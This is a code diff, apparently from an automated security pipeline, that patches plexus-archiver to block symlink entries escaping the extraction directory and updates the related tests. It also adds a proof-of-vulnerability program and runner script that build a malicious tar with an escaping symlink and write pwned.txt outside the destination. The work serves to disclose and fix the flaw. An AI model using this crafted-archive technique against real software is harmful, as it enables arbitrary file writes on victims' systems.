@@ -1,0 +1,304 @@
+diff --git a/src/main/java/org/codehaus/plexus/archiver/AbstractUnArchiver.java b/src/main/java/org/codehaus/plexus/archiver/AbstractUnArchiver.java
+index 52454f1..ec0aa56 100644
+--- a/src/main/java/org/codehaus/plexus/archiver/AbstractUnArchiver.java
++++ b/src/main/java/org/codehaus/plexus/archiver/AbstractUnArchiver.java
+@@ -352,6 +352,25 @@ protected void extractFile( final File srcF, final File dir, final InputStream c
+             throw new ArchiverException( "Entry is outside of the target directory (" + entryName + ")" );
+         }
+ 
++        // Make sure that a symbolic-link entry does not point outside of the destination directory.
++        // Otherwise a crafted archive could create a symlink escaping the extraction directory, which
++        // could later be followed to read or write arbitrary files outside of it (CWE-022).
++        if ( !StringUtils.isEmpty( symlinkDestination ) )
++        {
++            final File symlinkTarget = new File( symlinkDestination );
++            final Path canonicalSymlinkTarget =
++                ( symlinkTarget.isAbsolute()
++                    ? symlinkTarget
++                    : new File( targetFileName.getParentFile(), symlinkDestination ) )
++                .getCanonicalFile().toPath();
++
++            if ( !canonicalSymlinkTarget.startsWith( canonicalDirPath ) )
++            {
++                throw new ArchiverException(
++                    "Entry symlink destination is outside of the target directory (" + entryName + ")" );
++            }
++        }
++
+         try
+         {
+             if ( !shouldExtractEntry( dir, targetFileName, entryName, entryDate ) )
+diff --git a/src/test/java/org/codehaus/plexus/archiver/SymlinkTest.java b/src/test/java/org/codehaus/plexus/archiver/SymlinkTest.java
+index d2ebd4c..d82a4ae 100644
+--- a/src/test/java/org/codehaus/plexus/archiver/SymlinkTest.java
++++ b/src/test/java/org/codehaus/plexus/archiver/SymlinkTest.java
+@@ -9,11 +9,13 @@
+ import org.codehaus.plexus.archiver.tar.TarUnArchiver;
+ import org.codehaus.plexus.archiver.zip.ZipArchiver;
+ import org.codehaus.plexus.archiver.zip.ZipUnArchiver;
++import org.codehaus.plexus.util.FileUtils;
+ import org.junit.jupiter.api.Test;
+ import org.junit.jupiter.api.condition.DisabledOnOs;
+ import org.junit.jupiter.api.condition.OS;
+ 
+ import static org.junit.jupiter.api.Assertions.assertFalse;
++import static org.junit.jupiter.api.Assertions.assertThrows;
+ import static org.junit.jupiter.api.Assertions.assertTrue;
+ 
+ /**
+@@ -69,7 +71,10 @@ public void testSymlinkTar()
+         TarUnArchiver unarchiver = (TarUnArchiver) lookup( UnArchiver.class, "tar" );
+         unarchiver.setSourceFile( archiveFile );
+         unarchiver.setDestFile( output );
+-        unarchiver.extract();
++        // The fixture contains symlinks (e.g. ../onTheOutside.txt) whose destination escapes the
++        // extraction directory. Extraction must reject them instead of creating an escaping symlink.
++        ArchiverException exception = assertThrows( ArchiverException.class, unarchiver::extract );
++        assertTrue( exception.getMessage().contains( "symlink destination is outside" ) );
+     }
+ 
+     @Test
+@@ -90,7 +95,43 @@ public void testSymlinkZip()
+         ZipUnArchiver unarchiver = (ZipUnArchiver) lookup( UnArchiver.class, "zip" );
+         unarchiver.setSourceFile( archiveFile );
+         unarchiver.setDestFile( output );
++        // See testSymlinkTar: escaping symlink destinations must be rejected for zip archives too.
++        ArchiverException exception = assertThrows( ArchiverException.class, unarchiver::extract );
++        assertTrue( exception.getMessage().contains( "symlink destination is outside" ) );
++    }
++
++    /**
++     * A symbolic link whose destination stays within the extraction directory must still be
++     * extracted normally - the containment check must not reject legitimate symlinks.
++     */
++    @Test
++    @DisabledOnOs( OS.WINDOWS )
++    public void testSymlinkWithinDestinationIsExtracted()
++        throws Exception
++    {
++        File source = getTestFile( "target/output/symlink-safe-src" );
++        FileUtils.deleteDirectory( source );
++        source.mkdirs();
++        Files.write( new File( source, "fileR.txt" ).toPath(), "hello".getBytes() );
++        Files.createSymbolicLink( new File( source, "symR" ).toPath(), new File( "fileR.txt" ).toPath() );
++
++        TarArchiver archiver = (TarArchiver) lookup( Archiver.class, "tar" );
++        archiver.setLongfile( TarLongFileMode.posix );
++        archiver.addDirectory( source );
++        final File archiveFile = new File( "target/output/symlinks-safe.tar" );
++        archiver.setDestFile( archiveFile );
++        archiver.createArchive();
++
++        File output = getTestFile( "target/output/untaredSafeSymlinks" );
++        FileUtils.deleteDirectory( output );
++        output.mkdirs();
++        TarUnArchiver unarchiver = (TarUnArchiver) lookup( UnArchiver.class, "tar" );
++        unarchiver.setSourceFile( archiveFile );
++        unarchiver.setDestFile( output );
+         unarchiver.extract();
++
++        File extractedLink = new File( output, "symR" );
++        assertTrue( Files.isSymbolicLink( extractedLink.toPath() ) );
+     }
+ 
+     @Test
+diff --git a/.security-pipeline/pov/PovSymlinkEscape.java b/.security-pipeline/pov/PovSymlinkEscape.java
+new file mode 100644
+index 0000000..64b7ef2
+--- /dev/null
++++ b/.security-pipeline/pov/PovSymlinkEscape.java
+@@ -0,0 +1,158 @@
++import java.io.File;
++import java.io.OutputStream;
++import java.nio.charset.StandardCharsets;
++import java.nio.file.Files;
++import java.nio.file.Path;
++import java.nio.file.Paths;
++
++import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
++import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
++import org.apache.commons.compress.archivers.tar.TarConstants;
++import org.codehaus.plexus.archiver.tar.TarUnArchiver;
++
++/**
++ * Proof of vulnerability for CWE-022 (CVE-2023-37460 aligned) in plexus-archiver.
++ *
++ * TarUnArchiver.extractFile() validates that the *location* of an extracted entry
++ * stays inside the destination directory, but it does NOT validate the *target* of
++ * a symbolic-link entry. A crafted tar containing a symlink whose link name points
++ * outside the destination therefore causes AbstractUnArchiver to create a symlink
++ * that escapes the extraction directory (the CWE-022 sink at
++ * AbstractUnArchiver.java:371 -> SymlinkUtils.createSymbolicLink(..., new File(symlinkDestination))).
++ *
++ * A downstream consumer that later writes through that archive-created symlink then
++ * writes arbitrary files OUTSIDE the destination directory. This program demonstrates
++ * that end-to-end.
++ *
++ * Vulnerable (unpatched) code  -> escaping symlink is created, arbitrary write escapes -> exit 0
++ * Patched code                 -> symlink creation is rejected / made safe            -> exit non-zero
++ */
++public class PovSymlinkEscape
++{
++    public static void main( String[] args ) throws Exception
++    {
++        File repo = new File( "." ).getCanonicalFile();
++        File workRoot = new File( repo, "target/pov-work" );
++        deleteRecursively( workRoot );
++
++        File dest = new File( workRoot, "dest" );              // extraction destination
++        File escapeZone = new File( workRoot, "escape-zone" ); // OUTSIDE dest (sibling)
++        dest.mkdirs();
++        escapeZone.mkdirs();
++
++        File tarFile = new File( workRoot, "evil.tar" );
++
++        // Build a tar whose single entry is a symlink "evil" -> <escapeZone> (an
++        // absolute path outside the destination directory).
++        try ( TarArchiveOutputStream tos =
++                  new TarArchiveOutputStream( Files.newOutputStream( tarFile.toPath() ) ) )
++        {
++            tos.setLongFileMode( TarArchiveOutputStream.LONGFILE_POSIX );
++            TarArchiveEntry link = new TarArchiveEntry( "evil", TarConstants.LF_SYMLINK );
++            link.setLinkName( escapeZone.getCanonicalPath() );
++            tos.putArchiveEntry( link );
++            tos.closeArchiveEntry();
++        }
++
++        // Extract with the project's own TarUnArchiver.
++        TarUnArchiver un = new TarUnArchiver();
++        un.setSourceFile( tarFile );
++        un.setDestDirectory( dest );
++        try
++        {
++            un.extract();
++        }
++        catch ( Exception e )
++        {
++            System.out.println( "[POV] Extraction rejected the escaping symlink: "
++                + e.getClass().getName() + ": " + e.getMessage() );
++            System.out.println( "[POV] NOT VULNERABLE (patched behaviour)." );
++            System.exit( 2 );
++        }
++
++        File createdLink = new File( dest, "evil" );
++        Path canonicalDest = dest.getCanonicalFile().toPath();
++
++        if ( !Files.isSymbolicLink( createdLink.toPath() ) )
++        {
++            System.out.println( "[POV] No symlink was created inside the destination." );
++            System.out.println( "[POV] NOT VULNERABLE." );
++            System.exit( 3 );
++        }
++
++        // Resolve the raw symlink target (getCanonicalFile is unreliable across the
++        // Docker bind-mount, so read the link target directly).
++        Path rawTarget = Files.readSymbolicLink( createdLink.toPath() );
++        Path linkTarget;
++        if ( rawTarget.isAbsolute() )
++        {
++            linkTarget = rawTarget.normalize();
++        }
++        else
++        {
++            linkTarget = createdLink.toPath().getParent().resolve( rawTarget ).normalize();
++        }
++        boolean escapes = !linkTarget.startsWith( canonicalDest );
++        System.out.println( "[POV] Created symlink: " + createdLink );
++        System.out.println( "[POV]   -> points to: " + linkTarget );
++        System.out.println( "[POV]   destination dir: " + canonicalDest );
++        System.out.println( "[POV]   escapes destination? " + escapes );
++
++        if ( !escapes )
++        {
++            System.out.println( "[POV] Symlink was contained inside the destination." );
++            System.out.println( "[POV] NOT VULNERABLE." );
++            System.exit( 4 );
++        }
++
++        // Demonstrate concrete impact: a downstream consumer writing through the
++        // archive-created symlink escapes the destination and writes an arbitrary
++        // file outside of it.
++        File payloadViaLink = new File( createdLink, "pwned.txt" );
++        try ( OutputStream out = Files.newOutputStream( payloadViaLink.toPath() ) )
++        {
++            out.write( "arbitrary-file-write-outside-destination".getBytes( StandardCharsets.UTF_8 ) );
++        }
++
++        File escaped = new File( escapeZone, "pwned.txt" );
++        Path escapedPath = escaped.getCanonicalFile().toPath().normalize();
++        boolean wroteOutside = Files.exists( escapedPath ) && !escapedPath.startsWith( canonicalDest );
++
++        if ( wroteOutside )
++        {
++            System.out.println( "[POV] Arbitrary file written OUTSIDE destination: "
++                + escaped.getCanonicalPath() );
++            System.out.println( "[POV] VULNERABLE: archive-created symlink escaped the destination directory." );
++            System.exit( 0 );
++        }
++
++        System.out.println( "[POV] Escape write did not land outside the destination." );
++        System.out.println( "[POV] NOT VULNERABLE." );
++        System.exit( 5 );
++    }
++
++    private static void deleteRecursively( File f ) throws Exception
++    {
++        if ( !f.exists() )
++        {
++            return;
++        }
++        if ( Files.isSymbolicLink( f.toPath() ) )
++        {
++            f.delete();
++            return;
++        }
++        if ( f.isDirectory() )
++        {
++            File[] kids = f.listFiles();
++            if ( kids != null )
++            {
++                for ( File k : kids )
++                {
++                    deleteRecursively( k );
++                }
++            }
++        }
++        f.delete();
++    }
++}
+diff --git a/.security-pipeline/pov/out/PovSymlinkEscape.class b/.security-pipeline/pov/out/PovSymlinkEscape.class
+new file mode 100644
+index 0000000..4438b18
+Binary files /dev/null and b/.security-pipeline/pov/out/PovSymlinkEscape.class differ
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..66315e2
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,26 @@
++#!/usr/bin/env bash
++# Proof-of-vulnerability runner for finding-8b1319a81d0f (CWE-022, CVE-2023-37460 aligned).
++# Exits 0 when the vulnerable behaviour reproduces (archive-created symlink escapes the
++# destination directory and enables an arbitrary file write outside it), non-zero otherwise.
++set -euo pipefail
++
++cd /workspace/repo
++
++POV_DIR=".security-pipeline/pov"
++OUT_DIR="${POV_DIR}/out"
++CP_FILE="target/pov-cp.txt"
++
++echo "[POV] Compiling project main classes ..."
++mvn -B -q -DskipTests compile 1>&2
++
++echo "[POV] Resolving dependency classpath ..."
++mvn -B -q dependency:build-classpath -Dmdep.outputFile="${CP_FILE}" 1>&2
++
++CP="target/classes:$(cat "${CP_FILE}")"
++
++echo "[POV] Compiling POV ..."
++mkdir -p "${OUT_DIR}"
++javac -cp "${CP}" -d "${OUT_DIR}" "${POV_DIR}/PovSymlinkEscape.java"
++
++echo "[POV] Running POV ..."
++java -cp "${CP}:${OUT_DIR}" PovSymlinkEscape
